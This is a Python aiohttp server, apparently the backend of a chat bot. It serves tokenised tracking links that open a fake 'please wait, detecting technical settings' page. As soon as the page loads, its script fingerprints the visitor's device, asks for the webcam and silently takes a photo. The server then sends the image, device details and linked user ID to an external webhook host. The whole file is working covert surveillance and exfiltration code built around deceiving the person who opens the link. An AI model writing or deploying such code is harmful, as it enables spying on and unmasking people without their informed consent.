#!/usr/bin/env python3
# camera_api.py

import os
import json
import uuid
import base64
import asyncio
import aiohttp
import logging
from io import BytesIO
from aiohttp import web
import redis

# --------- LOGGING ---------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --------- ENV ---------
WEBHOOK_URL = os.getenv("MAIN_BOT_WEBHOOK_URL", "fit-roanna-runex-7a8db616.koyeb.app/webhook/device-data")
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
PORT = int(os.getenv("PORT", "8000"))

# --------- REDIS ---------
r = redis.from_url(REDIS_URL)

# --------- /create_token (Asosiy bot chaqiradi) ---------
async def create_token(request):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        if not user_id:
            return web.json_response({"error": "user_id kerak"}, status=400)

        token = str(uuid.uuid4())
        r.setex(f"camera_token:{token}", 3600, str(user_id))  # 1 soat

        return web.json_response({"token": token})
    except Exception as e:
        logger.exception("create_token xato")
        return web.json_response({"error": str(e)}, status=500)

# --------- /track (Foydalanuvchi ochadi) ---------
async def track_page(request):
    token = request.query.get("token")
    if not token or not r.exists(f"camera_token:{token}"):
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Yuklanmoqda...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .loader {{
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #777; }}
  </style>
</head>
<body>
  <h2>Iltimos, bir necha soniya kuting...</h2>
  <div class="loader"></div>
  <div class="note">Tajribangizni yaxshilash uchun texnik sozlamalar aniqlanmoqda</div>
  <script>
    async function collect() {{
      const data = {{
        timestamp: new Date().toLocaleString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages?.join(', ') || navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum"
      }};

      if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
      else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
      else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

      if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
      else if (/Android/.test(navigator.userAgent)) data.os = "Android";
      else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
      else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
      else data.os = "Boshqa";

      let hasImage = false;
      let imageData = null;

      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(r => {{ video.onloadedmetadata = r; video.play(); }});
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        imageData = canvas.toDataURL("image/jpeg", 0.7);
        hasImage = true;
        stream.getTracks().forEach(t => t.stop());
      }} catch (e) {{}}

      const payload = {{ token: "{token}", clientData: data }};
      if (hasImage) payload.image = imageData;

      await fetch("/submit", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify(payload)
      }});

      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2><p class='note'>Rahmat!</p>";
    }}
    collect();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

# --------- /submit (Ma'lumotni qabul qilish) ---------
async def submit_data(request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        image_data = body.get("image")

        user_id = r.get(f"camera_token:{token}")
        if not user_id:
            return web.Response(status=403)
        user_id = int(user_id)

        # Asosiy botga yuborish
        payload = {
            "user_id": user_id,
            "device_data": client_data,
            "image": image_data
        }

        async with request.app["session"].post(WEBHOOK_URL, json=payload) as resp:
            if resp.status != 200:
                logger.warning(f"Webhook failed: {resp.status}")

        # Tokenni o'chirish (bir marta ishlatilsin)
        r.delete(f"camera_token:{token}")

        return web.Response(status=200)
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500)

# --------- Web server boshlash ---------
async def start_web_server():
    app = web.Application()
    app["session"] = aiohttp.ClientSession()
    app.router.add_post("/create_token", create_token)
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Camera API ishga tushdi: http://0.0.0.0:{PORT}")

# --------- Main ---------
def main():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_web_server())
    loop.run_forever()

if __name__ == "__main__":
    main()
